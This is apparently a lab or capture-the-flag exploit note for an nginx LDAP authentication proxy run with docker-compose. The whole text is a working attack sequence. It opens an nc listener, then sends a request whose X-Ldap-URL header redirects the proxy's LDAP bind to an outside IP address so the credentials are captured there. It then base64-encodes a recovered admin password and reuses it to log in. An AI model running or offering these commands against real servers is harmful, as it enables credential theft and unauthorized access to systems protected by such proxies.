# Nginx ldap docker-compose
## Exploit
```
curl 'http://localhost:8080/'
nc -nlvp 444 > out.txt
curl 'http://localhost:8080/' -H "Authorization: basic YWRtaW46d3Jvbmc=" -H "X-Ldap-URL: ldap://109.248.6.199:444"
cat -v out.txt
echo -n 'admin:@dminpasswordisverysecure!2' | base64
curl 'http://localhost:8080/' -H 'Authorization: Basic YWRtaW46QGRtaW5wYXNzd29yZGlzdmVyeXNlY3VyZSEy'
```
